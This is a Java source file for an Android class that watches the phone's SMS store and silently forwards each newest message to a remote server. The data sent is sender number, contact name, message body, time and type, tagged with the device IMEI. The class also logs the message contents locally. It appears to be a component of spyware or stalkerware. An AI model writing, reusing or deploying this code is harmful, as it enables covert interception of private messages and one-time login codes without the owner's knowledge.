package com.phone.data;

import com.authority.AuthoritySettings;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import org.json.JSONArray;
import org.json.JSONObject;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;


public class SMSContentObserver extends ContentObserver implements Runnable{
	private final String TAG = "SMSContentObserver";
    private Handler mHandler = null;
    private Context mContext = null;

    public static SMSContentObserver gSmsContentObserver= null;


    public SMSContentObserver(Handler handler, Context context) {
        super(handler);
        this.mHandler = handler;
        this.mContext = context;
    }

    public void onChange(boolean selfChange) {
        super.onChange(selfChange);
        Log.e(TAG,"onChange");
        
        String address = "";
        String person = "";
        String body = "";
        String type = "";
        String id = "";
        String date = "";
        String strdate = "";
        //String ret = "";
		String[] projection = new String[] {"_id", "address", "person","body", "date", "type"};
		try{
			//inbox
			Cursor c = mContext.getContentResolver().query(Uri.parse("content://sms/"), projection,null, null, "date desc");
			if (c != null) {
				if (c.moveToFirst()) {
					address = c.getString(c.getColumnIndex("address"));
					
					person = c.getString(c.getColumnIndex("person"));
	
					body = c.getString(c.getColumnIndex("body"));
					
					type = c.getString(c.getColumnIndex("type"));
					
					id = c.getString(c.getColumnIndex("_id"));
					
					date = c.getString(c.getColumnIndex("date"));
	
					strdate = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(date));
					//ret= "latest message:" + "\t消息ID:" + id + "\t号码地址:" + address + "\t名称:" + person + 
					//		"\t消息内容:" + body + "\t时间:" + strdate + "\t类型:" + type +"\r\n";
					
					JSONObject jsobj=new JSONObject();
	    	   	  	jsobj.put("ID", id);
	    	   	  	jsobj.put("号码", address);
	    	   	  	jsobj.put("名称", person);
	    	   	  	jsobj.put("消息内容", body);
	    	   	  	jsobj.put("时间", strdate);
	    	   	  	jsobj.put("类型", type);
	    	   	  	JSONArray jsarray = new JSONArray();
	    	   	  	jsarray.put(0,jsobj);
					

			        SendDataToServer sendmsg = new SendDataToServer(jsarray.toString().getBytes(),
			        		jsarray.toString().getBytes().length,Public.CMD_DATA_LATESTMESSAGE, Public.IMEI);
			    	Thread threadsendloc = new Thread(sendmsg);
			    	threadsendloc.start();
					WriteDateFile.writeLogFile("SMSContentObserver receive new message:" + jsarray.toString());
					Log.e(TAG, jsarray.toString());
				}
				c.close();
			}
			else{
				Log.e(TAG, "not found message");
			}
		}catch(Exception ex){
			ex.printStackTrace();
			String errorString = ExceptionProcess.getExceptionDetail(ex);
			String stackString = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("SMSContentObserver exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
		}
	}
    
    
    @Override
    public void run(){
    	try {
			if (AuthoritySettings.checkSinglePermission(mContext, Manifest.permission.READ_SMS) == false){
				return;
			}
    		
        	Looper.prepare();
        	
        	ContentResolver cr = mContext.getContentResolver();
    		if (SMSContentObserver.gSmsContentObserver == null) {
    			SMSContentObserver.gSmsContentObserver = new SMSContentObserver(mHandler,mContext);
    		}
    		
    		cr.registerContentObserver(Uri.parse("content://sms/"), true,SMSContentObserver.gSmsContentObserver);
    		
    		Looper.loop();
		} catch (Exception e) {
			String error = ExceptionProcess.getExceptionDetail(e);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("SMSContentObserver exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
			e.printStackTrace();
		}

    }
}
